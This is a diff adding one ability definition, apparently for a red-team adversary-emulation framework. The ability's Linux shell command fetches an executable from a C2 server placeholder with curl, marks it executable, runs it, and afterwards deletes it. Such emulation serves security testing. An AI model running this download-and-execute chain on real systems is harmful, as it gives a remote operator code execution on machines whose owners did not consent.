@@ -1,0 +1,15 @@
+
+- id: 505be70d-3cb5-4d61-bf8c-0b8a2fc60d36
+  name: "Download and Execute Payload"
+  description: "Retrieve an executable from the C2 server and run it on the target"
+  tactic: execution
+  technique:
+    attack_id: T1204
+    name: "User Execution"
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s -o /tmp/payload #{server}/payload && chmod +x /tmp/payload && /tmp/payload
+        cleanup: |
+          rm -f /tmp/payload
